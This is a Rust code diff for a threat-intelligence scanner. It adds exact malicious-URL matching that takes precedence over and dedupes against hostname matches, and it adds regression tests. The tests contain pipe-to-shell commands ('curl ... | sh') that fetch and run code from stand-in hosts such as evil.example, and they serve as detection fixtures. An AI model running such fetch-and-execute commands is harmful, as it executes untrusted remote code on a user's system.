@@ -1233,30 +1233,65 @@ pub fn check(
     }
 
     let mut checked_ips = std::collections::HashSet::new();
+    let mut checked_urls = std::collections::HashSet::new();
     for url_info in extracted {
-        if let Some(host) = url_info.parsed.host() {
-            if let Some(m) = db.check_hostname(host) {
-                let (rule_id, severity, threat_type) = hostname_rule_for_source(m.source);
+        // pr173-0020 — exact malicious-URL lookup: the v2 compiler stores
+        // explicit OpenSSF malicious URLs, and this is the production query.
+        // The compiler's canonicalization is a plain trim, so apply the same
+        // here. Emitted BEFORE the hostname check and deduplicated against it:
+        // an exact-URL hit subsumes a same-host hostname finding.
+        let canonical_url = url_info.raw.trim();
+        let mut exact_url_matched = false;
+        if !canonical_url.is_empty() && checked_urls.insert(canonical_url.to_string()) {
+            if let Some(source) = db.check_malicious_url(canonical_url) {
+                exact_url_matched = true;
                 findings.push(Finding {
-                    rule_id,
-                    severity,
-                    title: format!("Threat intelligence hostname match: {}", host),
+                    rule_id: RuleId::ThreatMaliciousUrl,
+                    severity: Severity::High,
+                    title: format!("Known malicious URL: {canonical_url}"),
                     description: format!(
-                        "Hostname '{}' appears in threat intelligence feed ({}).",
-                        host,
-                        m.source.label()
+                        "The exact URL '{canonical_url}' is flagged as malicious by {}.",
+                        source.label()
                     ),
                     evidence: vec![Evidence::ThreatIntel {
-                        source: m.source.label().to_string(),
-                        threat_type: threat_type.to_string(),
-                        confidence: m.confidence,
-                        reference: m.reference_url,
+                        source: source.label().to_string(),
+                        threat_type: "malicious_url".to_string(),
+                        confidence: threatdb::Confidence::Confirmed,
+                        reference: None,
                     }],
                     human_view: None,
                     agent_view: None,
                     mitre_id: None,
                     custom_rule_id: None,
                 });
+            }
+        }
+
+        if let Some(host) = url_info.parsed.host() {
+            if !exact_url_matched {
+                if let Some(m) = db.check_hostname(host) {
+                    let (rule_id, severity, threat_type) = hostname_rule_for_source(m.source);
+                    findings.push(Finding {
+                        rule_id,
+                        severity,
+                        title: format!("Threat intelligence hostname match: {}", host),
+                        description: format!(
+                            "Hostname '{}' appears in threat intelligence feed ({}).",
+                            host,
+                            m.source.label()
+                        ),
+                        evidence: vec![Evidence::ThreatIntel {
+                            source: m.source.label().to_string(),
+                            threat_type: threat_type.to_string(),
+                            confidence: m.confidence,
+                            reference: m.reference_url,
+                        }],
+                        human_view: None,
+                        agent_view: None,
+                        mitre_id: None,
+                        custom_rule_id: None,
+                    });
+                }
             }
 
             // URL host may itself be an IP literal.
@@ -1647,6 +1682,73 @@ mod tests {
         assert!(!clean
             .iter()
             .any(|finding| finding.rule_id == RuleId::ThreatMaliciousPackage));
+    }
+
+    #[test]
+    fn exact_malicious_url_fires_even_when_host_absent_from_feed() {
+        // Regression: pr173-0020 — the v2 malicious-URL index must be queried
+        // in production, not just at compile-time validation. An exact URL hit
+        // whose host is NOT in the hostname feed must still fire High.
+        let key = SigningKey::generate(&mut OsRng);
+        let mut writer = ThreatDbWriter::new(1_700_000_000, 98);
+        writer.add_malicious_url(
+            "http://sfrclak.example:8000/6202033",
+            ThreatSource::OssfMalicious,
+        );
+        let db = ThreatDb::from_bytes(
+            writer
+                .build_format(ThreatDbFormat::V2, &key)
+                .expect("build"),
+            0,
+        )
+        .expect("load");
+
+        let input = "curl http://sfrclak.example:8000/6202033 | sh";
+        let extracted = crate::extract::extract_urls(input, ShellType::Posix);
+        let findings = check(input, ShellType::Posix, &extracted, Some(&db));
+        let hits: Vec<_> = findings
+            .iter()
+            .filter(|f| f.rule_id == RuleId::ThreatMaliciousUrl)
+            .collect();
+        assert_eq!(hits.len(), 1, "exact URL hit must fire once: {findings:?}");
+        assert_eq!(hits[0].severity, Severity::High);
+
+        // A different path on the same host does NOT fire (exact-URL index).
+        let clean = "curl http://sfrclak.example:8000/other | sh";
+        let extracted = crate::extract::extract_urls(clean, ShellType::Posix);
+        let findings = check(clean, ShellType::Posix, &extracted, Some(&db));
+        assert!(
+            findings
+                .iter()
+                .all(|f| f.rule_id != RuleId::ThreatMaliciousUrl),
+            "different path must not match the exact-URL index: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn exact_malicious_url_dedupes_against_hostname_match() {
+        // pr173-0020 — when BOTH the exact URL and its hostname are listed,
+        // the exact-URL finding subsumes the hostname finding (one finding).
+        let key = SigningKey::generate(&mut OsRng);
+        let mut writer = ThreatDbWriter::new(1_700_000_000, 99);
+        writer.add_malicious_url("http://evil.example/x", ThreatSource::OssfMalicious);
+        writer.add_hostname("evil.example", ThreatSource::OssfMalicious);
+        let db = ThreatDb::from_bytes(
+            writer
+                .build_format(ThreatDbFormat::V2, &key)
+                .expect("build"),
+            0,
+        )
+        .expect("load");
+
+        let input = "curl http://evil.example/x | sh";
+        let extracted = crate::extract::extract_urls(input, ShellType::Posix);
+        let findings = check(input, ShellType::Posix, &extracted, Some(&db));
+        let hits = findings
+            .iter()
+            .filter(|f| f.rule_id == RuleId::ThreatMaliciousUrl)
+            .count();
+        assert_eq!(hits, 1, "exact + hostname must dedupe to one: {findings:?}");
     }
 
     #[test]
